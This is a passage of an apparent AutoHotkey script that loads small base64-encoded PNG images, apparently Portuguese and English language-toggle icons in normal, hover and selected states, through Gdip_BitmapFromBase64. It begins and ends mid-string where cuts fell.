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")
A_Args.PNG.por  := Gdip_BitmapFromBase64(0,1,Data.PNG "B8AAAAUCAIAAAD6C3GtAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARnSURBVEhLtdX9UxpHGAfw/gePaKIxFbUtgy8EFBBO5FVsgraGoIT4lnjiCzkZ4TykhPgWhRNFFBWDSqUoKkgx1lF86cs0JvuX9eykSW3aqe2MO/fL7ex+bu+53e99Ir7OdqELVTKhWiZS10hqFZhWWVOnrtaqJBoF0y9QYAKFVCCXCmqwCrlUKJcI5EwPJlBeXMyAKo28WquU12kUX9Yys5jbSlX1xRQV9kEv9eG8uT5V2NEcHXu6E2jf9GpCFJfGs1x6oBpgoB4I/S3bPS6pAZsRnAZw67NGmjheXLlIGqNj9tSSK/2yZcOjWCQLJ1phqOGSXuLDy3/Xm/7Q1SGqlMbBdR9sD8DSpHVgWz7WiR/MY7wsinlAOww3c704w/1Zly+S7Kvo2mWyyNsNjlYOpZ315KMlOArC3jygCByFQTchB1d77mSv6r/qxE6gZYPmBYeLvWY7zUNh2J9mmVqVYq2pUtOie1gfn2KjBCwtFoqm2jhzw/rIJJlavJLO1P3J9kJjzG+N4MdRLorBrLuIxSOAQwHPBndsUO6CslHSLkNJQLFCT7SZ0bt2Vhi9dWPy73Xmq96Z65WGXJo1mkr69g9wtIeheGEymJ0jtLP4g9kSC/C7gdcN/D6ooKCUDkxwUTIf7Up/3jcGXtH9u5HG6LRyiSz6WOfQ5pt+uzrsWE6Z0akZZVp+3dX8EsvbXOkao9fHxj0WgoysxxzuKY3JzZJSwHle1dCNkrd/SijRgQGdEYfHw0+3RkqCrryJxx+vvcu5pnv9So4OG1GGQIcd59+r3m5/qm0y54rdOUJLAUbwaq1m+2Q6vTc9HajWTwLP8cP6529SsvN9Izoh0ZkDZQzheAPfawSq8YNeqZKJpx/vxEXoQIwO9e91lGBXaDqAR7FEPbkYAfweqLCAwFpWa0sk071UML3CPd/F3umnLnSif53CdNMNQOkvrb2Y7snz2/FIX4YZetqFjtqYyqBUfnPH/RzsRZGKoc1sRT+3zgYiAnjWu52h5W/jKPXZj9uytwdGdGZFZ0MzKZsw6GSN43+tTJkPLwtY+CG3LuKZ3xt5k2lFaRnaLozQbOA6b0htbAXBEvWylf15MmuBylF0b5WeMqNkHkrK0IE+cTjsTIV1UT+2SBVP/sOOVIcpfXS8Jb7UsUkH4wa0UYQ2gLBI4Asn8EkQEFBBsKqcIA3Utz1CcUDx24mtuz2xZ/jOKpVeYXYkc3T/Zb8TiYAx5itZGFHMmJbnCtAa+BycCrUpV2TJFhJlctxulTB0Zi3bFPiqdI55Xa/9iqfpfRJolgfzPBZwPNI9k6QDcL4AMfrmqufW+TKgKNhm+DfcD2GCUCwMmv5HzrxLsW/0MGDMIr42u0uPZ+F8HrxTbI6rAYaYFDMxIXq1FPN2lvt7lCHKEBm1xP1t33mYeOJ6O7OcjUDqoL8eLA94pErlkMBAE1DN4NJnPTdwPE/k8/bmtVFbIuhMhUzRCXnQxn7RAlT9Jf0a/x7X1cTi3wB5iYNtnmiGmwAAAABJRU5ErkJggg==")
A_Args.PNG.porH := Gdip_BitmapFromBase64(0,1,Data.PNG "B8AAAAUCAIAAAD6C3GtAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAATkSURBVEhLtZV5TNNnGMcfDqeDjW1yjGWDcAqKOhgR7GRQTsFtcm5QRAqCKMoUSgdy2P4klLa0xUIF8UCl0JZySLkp1AqjiB1iEYFSBCLDeKCEZcuyCW7vOjNjWMymS0yef97kfT9v8jzf9/MCGnZ7ffUXvVgaVnwpgtcbVTkQ3ziULB9Jb1N9w78Sx5VFYE3bsYt+WK0vJgosqPPh1n+G1X2OSYKwlkCsbUdRd/gFBVFyLblvNFM5ntWiStEuC6XBWKMfJt3xnG4rJjk0Z/vKOURlxdFRycHrAv9ulrWIpFNCAFYY5IcCJfpt2k5rhj8UxAF3N5RG65yKtRCkeXcw469W0DXSkulLSUNV+E6maeV+KAp/TudKw2zEpHXN2T5yTuwzul83y1ZEgpIooO2C3NhADu6GWO/RRSBXOOqwtRccgHKitSANv5Lu1ck0eRl6oIxpJsgAzj5LVlBjtRGSwv1WmGkBpID7cgi+4AW8Awb8LN8OxqvRqaOSpCGhQ1u5uYBMFzmgyzBbq5uw39s1MOHjgKSQPaGqGmM0DtIOU5eaZMvmckI/n6np+G/6076fPTzSHjnYkKcgPVRaoWvQWGqm50gFCzY4FsB6GqwrAfszTLoHUgMaNK2+Sozu56eP9vCmL+0f4r+Yrp3q+uYs925eQJ+IpRbPzpHQzFY0bKpu1V/lTNfdUKjvlgNOGeCQAU7ZsJkNtkJJpRVSG6EJ959n4yS3RdiEIlJZ6y1lmP2Drs2MpYi8poHuJ+fINGS0QEYPkn6b8P/lmuH1nvQK4cDZc1W5VIZiYJBTVhOQWKrnzgbLk1vCM5D6nZ/GvNFcDFqk3n1YfvTGaZtWnuGFQyvoRdJwO3H68b7gx7c90b2v0TwF3UtZuuXz+833gmLJBq5lq5xz1uIojtvzyHT+1PRMbZ3kUwIfHDk/DHz4ZNJjeTYePWKgRQ6a331ZFe4kiAd25HM6WxrhWndodNgF3XFFd6PRPFVLX77li8aNNwekgANb1+WIwVYKOGXCplzYeMx+O21MPZ3FbpvusV6awP1NXyhBjwiPJ3HBtWHAJqzojLko07CBntafPa/dupCO7if/OuGPNEbElKg3cOfNfKjg9K0xHrPeQQMXKjge+yK1S3ZlGE1+8OOIxx9zcWgxDy0W1U/SnFu5uudIUBS2Yqr2YpJ9U45TV1lIf3XLzOknD/ahqW3opqlCZAxWx1e704zxFL1Psky8McNteWt9Oe/v7BXWkJHaEKk90B3C2N1yrkYeomzAdbDM+ftenEg/OStaeS5JJU25LmxVxaAhMzQElFw3+IgLG5iwkQqbKHpbuODeFJq8F6m0Z98du/Fl5uAJ0uh3rKkebSK1Jvi316T1DGVMEjcotmk/ha9PlDWvRX0g5lhs9kt80yVX35lq70miH9P6Dx706SdKIuyaS4MVArqmU5v3VzBBgKzQsDoHOHtDTrhNS2C5HQaFa3qr31qSAVJCQf2G1WV7oJKCby9M+B+eeWqxNCiOhvw4HepX5DK7h42w1AKCGhOLknAoOgjlCVbCl7FYZ6iNIHXdxSPeXawYxZmc4Ybk76t8OphWglQdbiQwQgALhZxdDgwfX44b5McCiwg8gs7JGIuqw14tdGLfGdpYG1fTlais9GwtMDmfBOxQrPMZ/fX+Hq+rht3+BMs8118TOOLTAAAAAElFTkSuQmCC")
A_Args.PNG.porS := Gdip_BitmapFromBase64(0,1,Data.PNG "B8AAAAUCAIAAAD6C3GtAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAThSURBVEhLtdV9TNNHGAfwhxenk81t8jKXDQL4AypFhBEpTAYt0AoTKNgqtlQKglWUqJQO5cUWiaWtbbEDQRRRKfQNRCsgCCLiKNMOEVSwFIXINL6ghmXLsolut85scWRm0yUmz1+Xy+cud899D9TahjdXf+i+dLLvasoSRlQQK46YQotOWxOZuiqIFWsZxKihWGwItiIEiw7DrVjmGxOExRAxKhGLD8MSiD6ryARmLIlNi0lPonJY4al0QlKsNz0Ci/scoxNf6At1XK+mvIguOdtYvXNIv/myinxG6qbhWpUyQLoSdicAn/muMM5NTIbiFFCshXKm1YFkZ1UWqU2SerFaZG4vHTvL6a8lnpY41myEEtoM3V3H9WzKC++SJ/+lR56RLtRwoXQNCJOgIDlKHnxFZ/PoOPCqcVYyywKboJLtpsoiztTDTkscXkWP6pQ4qXJAvsFFGn2ibh5qh/stMN4MyAD3u4B6NAzKNs1V5ka0iV9PFwzpOf1qr1OVC1Q8kcYLnYOJeuu0jaSAqLQlFE78uoQBrT26Du1tjv7aDJemSkavUmJu+2/9+bkf2nq1NbGvscjAfWh0RZfgRLmTDU4AzjLAFcMiIXiWgkeVRBSCTID6HOsuspm9yuyh7rKxsxv7lS/XLbe6qCmXcKaM0qORmnQTt7loPAgNOppabGf5iay999gG5gM+B7xyAJ8HvjJYqNbXuCLTPDRC+HEiRX9LUzhiSDTWk9rFTv/UXTS8OY2iyC55p5mHHvPQA84vI+SfLtld7s6uVl84dLi2QCA2XOiTV2gp6eU2BBm47F9Ky0Gm934YJqHbLDQluPuwcueVg+4tZXZHt8zQfehkTJe9t4f65FYourcaTfLRvczpG+G/XvsgOpk3N6Bill/+/GA+bnkRT6S8OTZe36D/jKEEnPy7Cx8/Gw15OpGKHonRlBxNrj03QMOrUkGW+ELH0ykBDVuGBv3RnQB0l4kmBRb96Y0IdN3el5IJXjJr/x1zg/iA3w6LC8Bnl8dy4bBpLFd2aqzbbXok+E/9cSl6xHgyGkytXwkyxoyTWaDZbtcoyurNm7RMfZyN7mf8PEJG5nnszDVvBR9xChcA/kt7YqHbF0LwFwBuV8y2js5vBtHoR99fDfntdgqaKkJTJcdGhX4tCuvDXChZOUP30HE9TubjOyrie+uaxw8+e7AB3VyGrjkaNPbgunc2QWhP5Nt8mutAKrRbVjQ/Qv5h3Hm1lodMdsgUgu4whu9WKsxd8cbG4DbpAuWGl3dkZJeUaTzMGWjPvKxuGWChfifUD/yCQPhEAd4S8BHAYr7NUgUQTiZkrEcDgAbfH74Su71vH3foa+nNbktHWpLg316TJWf4w/qUPp176wHisfTOpvmoB3RyZ9/I9Lf9C2z9BB6hXNGuQDQID3ps0/V0rKmcalCJzKct/f4aSUDp3GNXlw/y9fH7Asf08LQV+tRzzte9M90JyAjFx7xnV6yDGj6xdU/a/8iZ5ymWBV8xYXeKlWAVrwJ7eAKmm0GldXAupUHJZqhMc1W/SorRIt1V2zyP7yB1SFmGqvzBxoxva8PbJK6qbVaKRBDHQ2EC5Cd5icMj5IGwOxmkbChjWO1nOdduDWsWsXuqhMOnFOaOdGNNaEuxwxEOyBIw2t/2/gZ/jzdV2obfATXYh08qa0uKAAAAAElFTkSuQmCC")
A_Args.PNG.eng  := Gdip_BitmapFromBase64(0,1,Data.PNG "B8AAAAUCAIAAAD6C3GtAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAWASURBVEhLtZX9VxJZGMf3P5haC8tWUdtc2wqB4X14Hd6ybE3LDUEjwwA1NBKRNFdF1IwkJJU4EEWEgkIyvIw4LCL8ZXsjtN3O2R97zvfcMzN3zmee+d7nufcn+EfGFzqTI4DZAg4ihtlCoVjG5UtEqIzK4HP5YgqVw+QKaTBXRKF8lbgiSUUohSKl0WRMloKHKBC+nMWSUmngOXgBTFXpHJ5IZVqVqBdW1ra79M5dDNeMbb7YjNReMwxPuurZuguMwbDfH/T7Az5/6P3HWGRnbzeZTKRSe+lcNlfM58vFIlCpUCD2cSwej4ZCMqm0SmdxhYzbz0esXlbH/Jo/brT53wTjTXLL4LSntrFPNbbULDT6npi94xPep5aAdSo8PRudc+zMOeL2xbTLTfh8h5GtQjR26A9kXW7MH8AwDJWgJ3RR16CT3T1rWQ52DLm8gcTgpM804zvTOqAffXlWNEGq73RB0AsIWoYgJwS5IWgTgrwQ5IOgT02tCYkSNwzvjz5N96gIr48giCeTLpjOqdKBs0jHlO7Z207j6vJmzLLwwe7aFvYu9I+vUdiGTu1Mg8S0Ff/8MZ74sBuPYJndHIERhTRRwP8+zBdLpXI1jkql6G62q98ONWpoMO8bXaZeRNQOvdXbZXR5fDv6Kd+AdeM8bGrXTF9ERs9duf9O27+h7ff03X+rffhe9yiiN0b0Q1Hj0J7FlltxHuF44fDIvRlrVy2QqUao7h6Ndpw7cEbZO6uzbfQ+di55InMvt5c2tlCNQ6N7BUtMHQOL9VfVq6drVmrOrvxMWq0heWpI3jMkbw0pcPZc7I6KwNLFw2K5+g+lcjFP4JgclXyjKzTPJZpFnSWgfRZw+RPm5WDPiIt/08a7a2tDhxsFI5GDg/DBQShHbBVLiXI5DUQQOxbr1u2ePZ0Bt03nnavEinPfYt3rfxC5cUvK5Z7QhYw//1L2Oe6OrRutHvvrqHnh/c2Hr4S3bb8rrVSlBeTu4SJuROBChOt8sU+IvmNwffXNgfMNoYutMYEEU2lyZsv+mDnV1bNFZwXqyBIqrUpncoRNyNgdg7utc3bpTbTn8ZovnCI1qO+Nu0jn29vv2zlyg7OB7CQ3OslNbnKz5xfyRl2Dr44MKKFfL8eEKKbqq9CfproBnR240CihUqt0hVIJPCtWbDuqjF8tLJTKhXJ5J0dE0tkwkQ8RhYBn/TWFvk5j+jhIkCcKIaKIVJlQ9WVMT4h5x8GcPWscjv9x5yNfjLKPVxVlMqNC+Z5Umenu2R80ENbJnN64p7geoTMCVPoGje661uakwi+bLq2cq3fW1n2KbO9m9rFCKV0s45UMTooSBLgmSkfyk15F2ezore7PXT2ZB7rsmDk3O4+bJ/buqcOo3C9G1wVi9/UOv3t9pfaXL3RShY5lklg2lcKT3gA2NZN75cphmWlHUPXIidyYbGEaGfDxqsqVSuK/3wcBbnPlcrJUCoUiI6NLwfD2v+lmmwcomcTxTA4PhrJj47nJqaQ3OD7ja+GaTjVpYCb/OHc6PXyFGqMwkmJ5+q4KHzal1X07TCTUcsVutP3G0jPYg9/R6y5pgRDlhGdz64AoHBUKhUAwZ7HmrLblZ86rvGGYyqrSpTxkd3g0BTyZniGWVvKe9fwLZ8Lh7OqbJ7VoIbKKwTd8T28dADrV2N9MHxoa9+D7edBNR+kMbrbE+OK36gE+V1Cly5RKHFRIxQ0gkEgwnOxQO1o4ptMX+6Gm3v+jQ03auquP6FLLg8eucDR1WDwCmzA2Zw9epnzrJjkoSpihBGKx5XwBwpdwETGLAw4NhELlggMEZvBQqVTU1iZqo4JRKpW20bhAYLaNzgMWs8E+yJcIRVKZTK5QKGQoKmUeO/OjAob/AaZ455O2a/ZIAAAAAElFTkSuQmCC")
A_Args.PNG.engH := Gdip_BitmapFromBase64(0,1,Data.PNG "B8AAAAUCAIAAAD6C3GtAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAYSSURBVEhLtdN5UFNXFAfgZ1sXoApK2Ywdi0utloooolJllUWrgqJii+KCSoBAQDbZI1tAQgADCIgGZV8NS0RBhGBoiEQDRAgQRSKEBLIQspQQIK8Ro9Nxpn965jdv3p158829550LgN1mXy8f9KJ87/zbXvjKkNwcP9rfyY9qIgYpqGTk5caaUESgc0mBT8aN4/1QiDJ9UMggFPIWCmEuZgwK4QYbiVDWshK32aoL0nQ7XtC294sfsKEQlV5f5g9NqHfwLq5+MuAegRtmC2DJbVVtfRrbomIz8T/svb56dxiNRKKQSGQiqftlD6P/zegwi8XkcMYmhDyhXCoF5XJQPqeQzYinBOMjI0PU7mlaokovu++7++ydOAxhz+kHT0jvYrJJT7tGDI6mh+U1a+j7QZPKIbbRHTdR7egMQmo6GZPTm4sdKih9c7/kXVHZBP6xhNgx20eXDTFmSWReQyObRGazx1ldN1R6ZaG/exhu33lsegXFFYEnkJlhmcTEu8TlG4MjkA9XHMxQ13bDA0AVAFQCAA4AGgGgDQAIANABAK/XbmQ6OAuiYqeQqZMenhICUSwW38zE34l2UunFWD9L15zQ28/dYuor2hhpxa8K8QM2XsVw9BOjvVFu1/J1HBLpI+97Rpivhkf62NxhoYQtnpmUyPj/zErnFhSgquYXFEPDPHd4EaAPQ8e6qvQirO8fPmUW3qURmHb36IbmjreROR3Bt1pX7Uo4ActbZ4n8/hf/FwHwZwHwZj//59dCXl4P74uI6Y9EDEYjxtKyhNW183y+bHa+sY3h4lmsaxwDaF5NDT6m0isK/J28sKFZrV7xteXN/QUPB8pb6YdgJbDQul0OCaeDy7S3etd/s6x66Yrq79Tql6k1LVMnLFdvX6rWuWIl46KnmD0xNysHFxYWD6AA5VIJny2mRKr0Uiz8GOyOA6wsNI0ccLuzgcRMqaR4xDVYnco6cCl7+6FYfeu4fpGoVySiCsX0OQUTBCeVkUjepGHo5y6PXo/iZ+VKcfWSmtqpdMwoPLDv5JmJAheVXo71M71yz8m35FJSS/StpqJHg6jil6dC6mzOZv3sjDF2Ttfe6tO037LRwhpvYdNiZd9h6/hi9/4ObQh5lQ513SaGtQPbEyZMSZtKQnHcPegmezq19JhB21R68T0fA4uki1GNv7lhy58OXo5/QuzlqOl4X0Xj1Ve5nPAvND8ShdPRrdXVr9U1aNSDNK3Re6apQ9TUJWvqUn/czLBxZEN9haj0qeRUzvnL9J17O1frMwO2qPRZdp6yZ3OLbZtffH4cA5kClIHgW6Gkf4LXK5Z2S2Y6m1seGZm07DAjmltSDhzstjjYd9iZ6enLTbgpflAiKijkRce+++tCj5U9J+eISuekWA7ZHhk97MQ97zEVFiXGZE5HRI8dO95vsrvT2KR1hwn+1+21xrseGqyvWamN09B63T8wzJ0an1FMyEG+Apz5tJuPpXwXK+bFtPhPeuahwTPn37t7cANDeUmoaewDASpj7Ko3zfEoyc6xxdru8XFX0uOWGo01H3T1RX2cyxrncTgCFqFzPCd/ug4/Pc7NLaFAw3GWJzMNzaKx8Z/+qpSdJwHBjwP1uZTLaRBkLSxQqX1xyPIu2sB/dVR2szIsFp/PFQq6qLxktDAzh9VOQecTDX9PXGIAu4O+oNJZkSa0LcYMI1OW/ZGJS1DBjYQJb7+3ZhbUn7YUxmRv2BNpui/sC11z/TVlLJwzmtvoIsnM/IxMRu6aTsNMY7IrbuO2HriRG2Sn0idL3YZjkRxlT3Lvisurpc0t0qpaZinO3feBuuE1QM/T1CrqC11rU7AyS/ThkJ0IBLqJPyUFFYr5Sa4gJY1hZf/cJ7ij8IpKF43n8JUTstgNZZQbodBYrj6lhuYJ366DAwZe/6cDawO0tobvPJweGI+nDXJm5fMLMhm7oKhrs9Hk59skRpjJEHsW4szBWw6SmqvE2rDH5SElubC0+HOIoBOIQKc85J+sHiQdtoHuu3EAZjhJQyLDTimDCHRJjHDNTfWowsIJdeG9bfGCgVvy0WwRNXYSbavSv1a6zf4Fn2FrfM8HfpYAAAAASUVORK5CYII=")
A_Args.PNG.engS := Gdip_BitmapFromBase64(0,1,Data.PNG "B8AAAAUCAIAAAD6C3GtAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAYTSURBVEhLtdN5UJJ5GAfwt93t0i0t1yvbadvo8EhT0BIVL/AmLRMtCw8oUFHUxszMI820Mo9Qs2ttK00zCzOyNEsNB0kL0zwpkwxBEUWBFS/eJaXdnWb2z575zjvv7513PvN7n9/zAiWl5d8vX3RLR2+YnbejxwGoHQZz8DASfWh/AEHfwhOF9ocYIOEob2Mo0hcCWcx+CMQfAsEuJBACwRsZEy2tSK5uJA90qJUN3nC74rnihSAIRKk7uPkS06qcQ4srnvZg46n9vDHS2fp79Z2qBgkpebRfdh1fYx7XwWC0MhhMOqPt9Vt21/vBfi6Xw+d/HhaNimakUnBmBpyZlcumxONjQwMDfaw2Ah6v1K2dfMwPXk2lNOzE3HzK+JhUwHjWMqCLzom7UquqE0HMKNNzTGw6l9mYldtwIYdJKWy/XNR34877P0s+3i4dpj2R0JumO7tlfexpBnP0UTWPweTxhgIDgpS6jTMGG0e1DCjKudvqm0xrYHLi8uhnrtOXb4qJT3+wApmrouFPA4B7AFAOAFQAqAaAegBoAIAmAHi3bhPH2WssIWU8/cIIjiBpoIvF4nN5NJipo1KHozC2voWxl176J1XdrWdnF7+5RetxCCkmZz012pXgH31N0/lM98CntwOcN/0DnTxBv0jCE0+NSGTCv6als/NyUFlz8/K+/lEs+TagQzKCuih1S5SPe1gpIvROPKURm/iotunDycKmmIsvVkPT9pKurLdN/3lb5Kso8vMocm1E5MvoY6+Pn+iMT+o6mdybmPw5O19UUTknFMqm56rr2d6EYi2TJEDtiJGRg1K3QWE8Q4pi81+EnK4sq+268aCn7EW3K6mEFPsQ6pyGiSnV0A+t+mFZxdIVFT+trFq2smaZSsNylcalK5tXrGIHEcS84dnpGXB+fuED5OCMVCLkhQRgl